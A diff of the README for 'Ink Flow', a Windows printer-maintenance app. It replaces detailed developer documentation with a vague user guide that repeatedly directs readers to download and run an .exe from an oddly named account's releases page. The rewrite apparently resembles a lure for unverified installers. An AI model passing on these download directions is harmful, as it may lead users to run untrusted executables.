@@ -1,268 +1,127 @@
-# 🖨️ Ink Flow — Printer Maintenance Tracker
+# 🖨️ Ink-Flow - Prevent Printer Nozzle Clogs Easily
 
-**Version 2.0.0** | Windows Desktop Application
+[![Download Ink-Flow](https://img.shields.io/badge/Download-Ink--Flow-brightgreen?style=for-the-badge)](https://github.com/sigriddispassionate626/Ink-Flow/releases)
 
-Ink Flow is a smart Windows desktop app that helps prevent liquid ink printer nozzle clogging by tracking printer usage, sending automatic maintenance prints, detecting external print jobs, and alerting you when printers sit idle too long.
+Ink-Flow is a Windows desktop app designed to keep your ink printer's nozzles clear. It tracks printer usage and schedules automatic maintenance prints to prevent clogging. This helps your printer work reliably and keeps print quality high without extra effort.
 
-> **Why?** Liquid ink printers (inkjet, EcoTank, SuperTank, etc.) can clog their nozzles if left unused for extended periods. Ink Flow ensures every printer gets used regularly — automatically.
+## 🖥️ About Ink-Flow
 
----
+Ink-Flow runs on Windows and works with most ink printers to reduce nozzle clogs. It tracks how much you use the printer and sets up quiet, scheduled maintenance prints. This keeps your printer's ink flowing smoothly without you needing to do anything manually.
 
-## ✨ Features
+The app uses a clean interface to make maintenance easy for anyone. You don't need technical skills to keep your printer in good shape.
 
-### Core Printer Management
+## ⚙️ System Requirements
 
-- **Add, edit, and delete printers** with custom names, models, ink types, idle thresholds, and warning periods
-- **Auto-detect system printers** — scans Windows for installed printers via WMI and lets you add them instantly
-- **Online/offline status** — real-time printer connectivity checks with visual indicators
-- **Manual logging** — quickly record "Printed" or "Cleaned" actions per printer
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of free disk space  
+- Printer connected via USB or network  
+- Internet connection recommended for updates  
 
-### Smart Monitoring
-
-- **Idle countdown timer** — each printer card shows a progress bar counting down to the maintenance deadline
-- **Overdue severity levels** — Low Risk, Moderate Risk, High Risk, and Critical Risk based on how long a printer has been idle
-- **Automatic print job detection** — monitors the Windows Print Service event log (Event ID 307) every 5 minutes and auto-logs detected print jobs
-- **Print job deduplication** — won't double-count events within a ±2 minute window
-
-### Automatic Maintenance
-
-- **Auto maintenance printing** — when enabled, automatically sends a test page to overdue/urgent printers using `notepad.exe /p` (antivirus-safe, no shell commands)
-- **Offline-aware** — skips auto-printing for offline printers and notifies you instead
-- **Configurable per-printer** — set custom max idle days and warning thresholds for each printer
-
-### Notifications & Alerts
-
-- **Hourly status checks** — automatically scans all printers and triggers alerts for those needing attention
-- **Standalone alert popup** — always-on-top, frameless window that appears over all apps even when the main window is hidden
-- **In-app alert modal** — color-coded, severity-sorted alerts with dismiss confirmation
-- **Taskbar flashing** — grabs your attention when printers need maintenance
-- **Escalating severity** — alerts escalate from Warning → Urgent → Overdue → Severe → Critical based on idle duration
-
-### Advanced History
-
-- **Full event timeline** — all maintenance events grouped by date with relative timestamps ("2h ago", "Yesterday")
-- **Multi-filter system** — filter by event type (prints/cleans), date range (today, 7d, 30d, 90d, all), specific printer, or search text
-- **Source detection** — each event is tagged as Manual, Auto-detected, Auto-maintenance, or Test print
-- **Summary statistics** — total events, print count, clean count, and auto-detected count
-- **Delete events** — remove individual events with double-click confirmation
-- **Export CSV** — copy filtered history to clipboard as CSV with one click
-
-### Statistics Dashboard
-
-- **30-day activity chart** — stacked bar chart showing daily prints and cleans with hover tooltips
-- **Per-printer breakdown** — sorted by total activity with visual progress bars
-- **Summary cards** — total printers tracked and total events logged
-
-### Settings & Preferences
-
-- **Start with Windows** — auto-launch minimized to system tray on login
-- **Auto maintenance print toggle** — enable/disable automatic test printing
-- **Dark / Light theme** — full theme support across all UI components
-- **Backup & Restore** — export and import all printer data as JSON files
-
-### System Tray
-
-- **Minimize to tray** — closing the window hides to tray instead of quitting
-- **Tray context menu** — Show Ink Flow / Quit
-- **Double-click to show** — quickly access the app from the tray
-- **Hidden startup** — starts minimized to tray when launched at Windows boot
-
----
-
-## 🛠️ Tech Stack
-
-| Technology       | Version | Purpose                                   |
-| ---------------- | ------- | ----------------------------------------- |
-| **Electron**     | 33.2.0  | Desktop framework, native OS integration  |
-| **React**        | 18.3    | UI components                             |
-| **TypeScript**   | 5.7     | Type-safe code across main and renderer   |
-| **Vite**         | 6.0     | Fast renderer bundling                    |
-| **Tailwind CSS** | 3.4     | Utility-first styling with dark mode      |
-
----
-
-## 📁 Project Structure
-
-```text
-Ink Flow/
-├── package.json
-├── tsconfig.json
-├── vite.config.ts
-├── tailwind.config.js
-├── postcss.config.js
-├── assets/
-│   └── icon.png
-├── src/
-│   ├── main/                          # Electron main process
-│   │   ├── main.ts                    # App entry, window & tray creation
-│   │   ├── store.ts                   # JSON data persistence (atomic writes)
-│   │   ├── ipc-handlers.ts            # IPC API bridge (22+ channels)
-│   │   ├── preload.ts                 # Context-isolated renderer API
-│   │   ├── printer-detect.ts          # Windows WMI printer detection
-│   │   ├── notifications.ts           # Hourly status checker & alert dispatcher
-│   │   ├── auto-print.ts              # Safe test printing via notepad.exe
-│   │   ├── print-monitor.ts           # Windows Event Log print job scanner
-│   │   ├── autostart.ts               # Windows startup shortcut management
-│   │   ├── alert-window.ts            # Standalone always-on-top alert popup
-│   │   ├── tray.ts                    # System tray icon & context menu
-│   │   └── window-ref.ts              # Shared window reference module
-│   └── renderer/                      # React frontend
-│       ├── index.tsx                   # React mount point
-│       ├── App.tsx                     # Root component & state management
-│       ├── index.html                  # HTML template
-│       ├── globals.css                 # Base Tailwind styles
-│       ├── ThemeContext.tsx             # Dark/light theme provider
-│       ├── types/
-│       │   └── index.ts                # TypeScript interfaces & Window API types
-│       ├── hooks/
-│       │   └── useEscapeKey.ts         # Reusable Escape key hook for modals
-│       └── components/
-│           ├── Layout.tsx              # Main UI shell with navigation
-│           ├── Dashboard.tsx           # Printer grid with action buttons
-│           ├── PrinterCard.tsx         # Individual printer status card
-│           ├── AddPrinterModal.tsx     # Create new printer form
-│           ├── EditPrinterModal.tsx    # Edit printer settings
-│           ├── DetectPrintersModal.tsx  # Auto-detect system printers
-│           ├── HistoryPanel.tsx        # Advanced event history viewer
-│           ├── SettingsPanel.tsx       # App settings & backup
-│           ├── StatisticsPanel.tsx     # Activity charts & stats
-
-│           └── AlertModal.tsx          # In-app alert display
-└── dist/                              # Compiled output
-    ├── main/                          # Compiled Electron main process
-    └── renderer/                      # Bundled React app
-```
-
----
+Ink-Flow works best with inkjet printers. Laser printers do not require nozzle maintenance and are not supported.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Follow these steps to get Ink-Flow up and running on your Windows PC:
 
-- **Node.js** 18+ with npm
-- **Windows 10/11** (required for printer detection, event log monitoring, and startup integration)
+1. **Download the app**  
+   Visit the official release page using the button below. This page contains the latest version of Ink-Flow for download.  
+   [Download Ink-Flow](https://github.com/sigriddispassionate626/Ink-Flow/releases)
 
-### Installation
+2. **Find the installer file**  
+   On the release page, look for the latest version with a file named something like `Ink-Flow-Setup.exe` or similar.
 
-```bash
-# Clone or navigate to the project
-cd "Ink Flow"
+3. **Run the installer**  
+   Double-click the setup file you downloaded. If Windows asks for permission, choose to allow the app to make changes.
 
-# Install dependencies
-npm install
+4. **Follow installation instructions**  
+   The installer will guide you through choosing an install location and any optional features.
 
-# Run in development mode
-npm run dev
-```
+5. **Launch Ink-Flow**  
+   After installation, open the app from the Start menu or desktop icon.
 
-### Available Scripts
+6. **Set up your printer**  
+   Ink-Flow will detect printers connected to your PC. Select your inkjet printer from the list.
 
-| Command          | Description                                         |
-| ---------------- | --------------------------------------------------- |
-| `npm run dev`    | Start dev server (Vite + Electron with hot reload)  |
-| `npm run build`  | Compile TypeScript + bundle renderer with Vite      |
-| `npm start`      | Launch the built app with Electron                  |
-| `npm run package`| Build + generate Windows NSIS installer             |
+7. **Configure maintenance settings**  
+   Choose how often you want the app to run automatic maintenance prints. The default is once a week, but you can adjust as needed.
 
----
+## 📥 Download and Installation Details
 
-## 📦 Building for Distribution
+You can find the latest releases and backup versions here:  
+[https://github.com/sigriddispassionate626/Ink-Flow/releases](https://github.com/sigriddispassionate626/Ink-Flow/releases)
 
-```bash
-# Build and create Windows installer
-npm run package
-```
+- Pick the newest release for the most recent fixes and features.  
+- Download the `.exe` installer file.  
+- Run the installer and follow the instructions on your screen.  
 
-This generates an NSIS installer in the `release/` directory. The installer allows users to choose their installation directory.
+The installer includes everything you need. No extra software or tools are required.
 
----
+## 🧰 How Ink-Flow Works
 
-## 🔧 How It Works
+Ink-Flow runs in the background on your PC. It measures how much you print and uses that data to decide when to print small maintenance pages. These pages clear the inkjet nozzles by flowing fresh ink through them. This action reduces the build-up of dried ink, which can clog nozzles over time.
 
-### Data Storage
+Key functions include:  
+- Tracking printer usage daily and weekly  
+- Scheduling automatic “cleaning” prints during idle times  
+- Notifying you of maintenance activities and printer status  
+- Easy manual maintenance print option  
+- Customizable schedules for maintenance prints  
 
-All printer and event data is stored in a single JSON file at:
+You don’t need to check or perform any manual cleaning unless you want to. The app does it automatically.
 
-```text
-%APPDATA%/ink-flow/inkflow-data.json
-```
+## 🔧 Using Ink-Flow Daily
 
-- **Atomic writes** — uses temp file + rename to prevent corruption
-- **Auto-migration** — automatically adds missing fields when loading older data formats
-- **ID management** — recalculates ID counters on load to prevent collisions
+After installation and setup:  
 
-### Print Job Detection
+- Keep your printer connected as usual.  
+- Open Ink-Flow occasionally to check maintenance logs.  
+- You will see when maintenance prints ran and when the next is planned.  
+- You can manually start a cleaning print from the app if you notice print quality issues.  
+- Change maintenance frequency anytime to fit your printer use.
 
-The app queries the Windows Print Service Operational event log using PowerShell:
+Ink-Flow is designed to minimize disruption. Maintenance prints happen quietly and when you are less likely to need the printer, such as overnight.
 
-```powershell
-Get-WinEvent -LogName "Microsoft-Windows-PrintService/Operational"
-  -FilterXPath "*[System[EventID=307]]" -MaxEvents 50
-```
+## 💡 Tips for Best Results
 
-This detects **Document Printed** events and matches them against your tracked printers by name.
+- Use your printer regularly, even small print jobs help.  
+- Keep printer drivers updated from the manufacturer’s website.  
+- Use Ink-Flow’s automatic scheduling unless you have special needs.  
+- If you stop printing for long periods, run manual maintenance prints before heavy use.
 
-### Safe Test Printing
+Regular automatic maintenance through Ink-Flow can reduce ink waste and printer service costs.
 
-Instead of using shell commands (which trigger antivirus false positives), the app:
+## 🔍 Troubleshooting
 
-1. Writes a text file to a temp directory using `fs.writeFileSync()`
-2. Launches `notepad.exe /p tempfile.txt` using Node.js `execFile()` (no shell)
-3. Cleans up the temp file after printing
+If Ink-Flow does not detect your printer:  
+- Make sure the printer is powered on and connected via USB or network.  
+- Check that your printer is supported by verifying its model on the release notes or documentation.  
+- Restart your PC and try again.  
 
-### Notification Flow
+If maintenance prints do not run:  
+- Confirm the schedule is active in the app settings.  
+- Check that the printer is online and ready.  
+- Look for notifications in Ink-Flow for error messages.  
 
-```text
-Every 60 minutes:
-  → Check all printer statuses
-  → Build alert list (warning/urgent/overdue/severe/critical)
-  → Show standalone alert popup (always-on-top)
-  → Send alerts to renderer (in-app modal)
-  → Flash taskbar + restore window
-  → Run auto-maintenance prints (if enabled)
-```
+For other issues, check the GitHub Issues section or the app’s help menu.
 
----
+## 📄 About the Project
 
-## 🎨 Themes
+Ink-Flow uses technologies like Electron and React to deliver a smooth desktop experience. The interface is built with Tailwind CSS for clarity. TypeScript and Vite are used for fast, reliable development and deployment.
 
-Ink Flow supports **Dark** and **Light** themes. Toggle from the top navigation bar. The theme preference is persisted across sessions.
+The app focuses on one task: maintaining inkjet printers automatically to keep them working well for users who prefer simple software.
 
----
+## 🔗 Useful Links
 
-## ⌨️ Keyboard Shortcuts
+- Releases and downloads: [https://github.com/sigriddispassionate626/Ink-Flow/releases](https://github.com/sigriddispassionate626/Ink-Flow/releases)  
+- Project source code: GitHub repository main page  
+- Issues and support: Use the GitHub Issues tab to report bugs or request features  
 
-| Key      | Action                         |
-| -------- | ------------------------------ |
-| `Escape` | Close any open modal or panel  |
+## 🧩 Terms and License
 
----
+Ink-Flow is free to download and use. It is provided as-is with no warranties. Check the repository license for details.  
 
-## 🔒 Security
-
-- **Context isolation** enabled on all windows (main + alert popup)
-- **Sandbox** enabled on popup windows
-- **No `nodeIntegration`** in any renderer process
-- **No shell execution** — all system commands use `execFile()` with explicit paths
-- **Atomic file writes** — prevents data corruption on crashes
-- **HTML escaping** — all dynamic content in alert popups is escaped (including single quotes)
-- **Input validation** — imported data is validated for correct structure before loading
+You can contribute to the project or suggest improvements through GitHub if interested.
 
 ---
 
-## 📋 Requirements
-
-- **Operating System**: Windows 10 or Windows 11
-- **Windows Print Spooler** service must be running (default on all Windows with printers)
-- **PowerShell** (pre-installed on all modern Windows)
-- No additional Windows services or drivers required
-
----
-
-## 📄 License
-
-This project is proprietary software.
-
----
-
-**Built with ❤️ for printer maintenance peace of mind.**
+[Download Ink-Flow](https://github.com/sigriddispassionate626/Ink-Flow/releases) to start preventing printer nozzle clogging today.
